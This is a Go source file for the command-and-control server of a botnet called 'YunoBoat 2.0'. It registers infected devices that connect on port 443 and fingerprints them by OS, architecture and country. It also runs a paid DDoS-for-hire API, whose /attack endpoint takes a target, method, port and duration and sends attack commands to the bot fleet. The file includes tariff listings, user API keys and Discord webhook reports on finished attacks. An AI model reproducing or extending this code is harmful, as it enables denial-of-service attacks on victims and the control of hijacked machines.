package main

import (
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"
)

var (
	clientList *ClientList = NewClientList()
	store      *Store      = loadStore(dbFile)
)

func main() {
	go apiServer()
	go watchAttacks()
	go fleetReporter()

	// Admin panel over SSH (port 1234): ssh -p 1234 <user>@<host>
	go sshServer()

	// Bot control channel — port 443. The dispatcher still sniffs the magic
	// bytes, so a stray connection on 443 falls through to the admin flow.
	tel, err := net.Listen("tcp", listenAddr)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Printf("\x1b[1;36m[YunoBoat 2.0] bot control listening on %s\x1b[0m\n", listenAddr)

	for {
		conn, err := tel.Accept()
		if err != nil {
			continue
		}
		go initialHandler(conn)
	}
}

// Decide whether the incoming connection is a bot (00 00 00 <version>) or an
// admin telnet session. Bots then send id_len, id, and device fingerprint:
// os, arch, impl (each a 1-byte length + bytes).
func initialHandler(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	// TCP is a stream — conn.Read may return fewer bytes than asked. Read
	// the 4-byte magic with readXBytes so a short read never drops a bot.
	buf := make([]byte, 4)
	if err := readXBytes(conn, buf); err != nil {
		return
	}

	if buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		// id string
		var source string
		lb := make([]byte, 1)
		if err := readXBytes(conn, lb); err != nil {
			return
		}
		if lb[0] > 0 {
			sb := make([]byte, lb[0])
			if err := readXBytes(conn, sb); err != nil {
				return
			}
			source = string(sb)
		}
		// device fingerprint: os, arch, impl
		cc := countryCode(remoteIP(conn))
		dev := Device{OS: "?", Arch: "?", Impl: "?", Ver: buf[3], CC: cc}
		for _, d := range []*string{&dev.OS, &dev.Arch, &dev.Impl} {
			b := make([]byte, 1)
			if err := readXBytes(conn, b); err != nil {
				return
			}
			if b[0] > 0 {
				bb := make([]byte, b[0])
				if err := readXBytes(conn, bb); err != nil {
					return
				}
				*d = string(bb)
			}
		}
		// login/auth key (validated only when YB_KEY is configured)
		kb := make([]byte, 1)
		if err := readXBytes(conn, kb); err != nil {
			return
		}
		var key string
		if kb[0] > 0 {
			bb := make([]byte, kb[0])
			if err := readXBytes(conn, bb); err != nil {
				return
			}
			key = string(bb)
		}
		if authKey != "" && key != authKey {
			fmt.Printf("\x1b[1;31m[-]\x1b[0m reject %s (bad auth key)\n", remoteIP(conn))
			return
		}
		conn.SetDeadline(time.Time{})
		NewBot(conn, buf[3], source, dev).Handle()
	} else {
		NewAdmin(conn).Handle()
	}
}

func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0
	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("connection closed unexpectedly")
		}
		tl += n
	}
	return nil
}

// remoteIP extracts the peer IP string from a net.Conn (handles *net.TCPConn).
func remoteIP(conn net.Conn) string {
	if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
		return addr.IP.String()
	}
	host, _, err := net.SplitHostPort(conn.RemoteAddr().String())
	if err != nil {
		return conn.RemoteAddr().String()
	}
	return host
}

// countryCode maps a public IPv4 to a 2-letter ISO country code. It prefers
// the live geolocation API (cached per IP in geo.go); only when every provider
// is unreachable does it fall back to the coarse offline table.
func countryCode(ip string) string {
	if c := apiCountryCode(ip); c != "" {
		return c
	}
	parsed := net.ParseIP(ip)
	if parsed == nil || parsed.To4() == nil {
		return "??"
	}
	if parsed.IsPrivate() || parsed.IsLoopback() || parsed.IsLinkLocalUnicast() ||
		parsed.IsUnspecified() || parsed.IsMulticast() {
		return "??"
	}
	n := binary.BigEndian.Uint32(parsed.To4())
	for i := 0; i < len(geoRanges); i += 2 {
		if n >= geoRanges[i] && n <= geoRanges[i+1] {
			return geoCode((i/2)%len(geoCC))
		}
	}
	return "??"
}

// geoCode returns the country code for a geo range index.
func geoCode(idx int) string {
	return geoCC[idx%len(geoCC)]
}

// ---------------------------------------------------------------------------
// HTTP API for yourdomain — launch attacks over HTTP endpoint.
//   GET /attack?key=<apikey>&target=<ip>&method=<m>&port=<p>&time=<s>[&flags=..]
//   GET /status?key=<apikey>
//   GET /tarifs
//   GET /methods
// The API binds on :80 (plain HTTP, no port in URL).
// ---------------------------------------------------------------------------

type apiResult struct {
	Ok     bool   `json:"ok"`
	Msg    string `json:"msg,omitempty"`
	Target string `json:"target,omitempty"`
	Method string `json:"method,omitempty"`
}

func apiServer() {
	mux := http.NewServeMux()
	mux.HandleFunc("/attack", apiAttack)
	mux.HandleFunc("/status", apiStatus)
	mux.HandleFunc("/tarifs", apiTarifs)
	mux.HandleFunc("/methods", apiMethods)
	mux.HandleFunc("/users", apiUsers)
	mux.HandleFunc("/key", apiKey)
	mux.HandleFunc("/exec", apiExec)
	mux.HandleFunc("/stop", apiStop)
	srv := &http.Server{Addr: apiAddr, Handler: mux}
	fmt.Printf("\x1b[1;36m[YunoBoat 2.0] api on %s (public: %s)\x1b[0m\n", apiAddr, apiDomain)
	_ = srv.ListenAndServe()
}

// apiKey issues (or rotates) a personal API key.
//   GET /key?user=<u>&pass=<p>[&rotate=1]
func apiKey(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	user := q.Get("user")
	pass := q.Get("pass")
	ok, acc := store.TryLogin(user, pass)
	if !ok {
		writeJSON(w, apiResult{Ok: false, Msg: "bad user/pass"})
		return
	}
	key := acc.APIKey
	if key == "" || q.Get("rotate") == "1" {
		key = store.RotateAPIKey(user)
	}
	endpoint := "http://" + apiDomain + "/attack"
	if apiAddr != ":80" && apiAddr != ":443" && apiAddr != "" {
		endpoint = "http://" + apiDomain + apiAddr + "/attack"
	}
	writeJSON(w, map[string]interface{}{
		"ok": true, "user": user, "apikey": key,
		"endpoint": endpoint,
	})
}

func apiMethods(w http.ResponseWriter, r *http.Request) {
	names := make([]interface{}, 0, len(attackInfoLookup))
	for name, info := range attackInfoLookup {
		names = append(names, map[string]interface{}{
			"name": name, "id": info.attackID, "desc": info.attackDescription})
	}
	writeJSON(w, names)
}

// apiUsers lets an admin key dump the account list (registration/ops).
func apiUsers(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	key := q.Get("key")
	var admin *Account
	if a := store.ByAPIKey(key); a != nil && a.Admin {
		admin = a
	}
	if admin == nil {
		store.mu.Lock()
		for _, u := range store.Users {
			if u.Admin && (u.Password == key || u.Username == key) {
				admin = u
				break
			}
		}
		store.mu.Unlock()
	}
	var out []map[string]interface{}
	if admin != nil {
		store.mu.Lock()
		for name, u := range store.Users {
			out = append(out, map[string]interface{}{
				"user": name, "plan": u.Plan, "count": u.Count,
				"maxdur": u.MaxDur, "admin": u.Admin, "apikey": u.APIKey})
		}
		store.mu.Unlock()
	}
	if admin == nil {
		writeJSON(w, apiResult{Ok: false, Msg: "admin key required"})
		return
	}
	writeJSON(w, out)
}

func writeJSON(w http.ResponseWriter, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(v)
}

func apiAttack(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	key := q.Get("key")
	if key == "" {
		writeJSON(w, apiResult{Ok: false, Msg: "missing api key (get one at /key?user=..&pass=..)"})
		return
	}
	// Resolve the account from its personal API key (username also accepted so
	// the admin can script with a name during setup).
	user := store.ByAPIKey(key)
	if user == nil {
		store.mu.Lock()
		for _, u := range store.Users {
			if u.Username == key {
				user = u
				break
			}
		}
		store.mu.Unlock()
	}
	if user == nil {
		writeJSON(w, apiResult{Ok: false, Msg: "bad api key"})
		return
	}

	target := q.Get("target")
	method := q.Get("method")
	if target == "" || method == "" {
		writeJSON(w, apiResult{Ok: false, Msg: "target and method required"})
		return
	}
	secs, _ := strconv.Atoi(q.Get("time"))
	if secs <= 0 {
		secs = 60
	}
	// Build the full CLI command string: method target time flags
	cmd := method + " " + target + " " + strconv.Itoa(secs)
	if p := q.Get("port"); p != "" {
		cmd += " port=" + p
	}
	for k, vals := range q {
		if k == "key" || k == "target" || k == "method" || k == "time" || k == "port" {
			continue
		}
		flagName := k
		if k == "http_method" || k == "httpMethod" {
			flagName = "method"
		}
		if _, ok := flagInfoLookup[flagName]; !ok {
			continue
		}
		v := vals[0]
		if v == "" {
			continue
		}
		if strings.ContainsAny(v, " \t\"'") {
			v = strconv.Quote(v)
		}
		if v == "true" {
			v = "1"
		} else if v == "false" {
			v = "0"
		}
		cmd += " " + flagName + "=" + v
	}

	atk, err := NewAttack(cmd)
	if err != nil {
		writeJSON(w, apiResult{Ok: false, Msg: err.Error()})
		return
	}
	buf, err := atk.Build()
	if err != nil {
		writeJSON(w, apiResult{Ok: false, Msg: err.Error()})
		return
	}
	if store.IsWhitelistedTarget(atk.Target) ||
		(atk.Domain != "" && store.IsWhitelistedTarget(atk.Domain)) {
		writeJSON(w, apiResult{Ok: false, Msg: "нельзя кинуть атаку на " + atk.Target + " — цель находится в whitelist"})
		return
	}
	if ok, msg := store.CanLaunch(user, atk.Target, atk.Name, int(atk.Duration)); !ok {
		writeJSON(w, apiResult{Ok: false, Msg: msg.Error()})
		return
	}
	store.RegisterAttack(user, atk.Target, atk.Name, atk.Port(), int(atk.Duration))
	hookAttackLaunch(user.Username, atk.Name, atk.Target, atk.Port(), int(atk.Duration))
	clientList.QueueBuf(buf, -1, "")
	writeJSON(w, apiResult{Ok: true, Target: atk.Target, Method: atk.Name})
}

func apiStatus(w http.ResponseWriter, r *http.Request) {
	key := r.URL.Query().Get("key")
	acc := store.ByAPIKey(key)
	if acc == nil {
		store.mu.Lock()
		for _, u := range store.Users {
			if u.Username == key {
				acc = u
				break
			}
		}
		store.mu.Unlock()
	}
	if acc == nil {
		writeJSON(w, apiResult{Ok: false, Msg: "bad api key"})
		return
	}
	writeJSON(w, map[string]interface{}{
		"bots":         clientList.Count(),
		"running":      store.Running(),
		"distribution": clientList.Distribution(),
		"by_country":   clientList.ByCountry(),
		"user":         acc.Username,
	})
}

func apiTarifs(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, tariffsDefault)
}

// watchAttacks tracks active attacks and posts a finish report to the webhook
// the moment one runs out. Keeps its own snapshot so the record is still known
// after Store.Running() prunes it.
func watchAttacks() {
	last := map[int64]*AttackRec{}
	for range time.Tick(5 * time.Second) {
		if !hookEnabled() {
			continue
		}
		running := store.Running()
		live := map[int64]bool{}
		for _, r := range running {
			live[r.ID] = true
		}
		for id, rec := range last {
			if !live[id] {
				hookAttackFinish(rec.User, rec.Method, rec.Target, rec.Port, rec.Duration)
			}
		}
		next := map[int64]*AttackRec{}
		for _, r := range running {
			c := *r
			next[c.ID] = &c
		}
		last = next
	}
}

// fleetReporter emits a fleet-status embed once an hour so the Discord
// thread is not spammed by churn.
func fleetReporter() {
	hookFleet()
	for range time.Tick(time.Hour) {
		hookFleet()
	}
}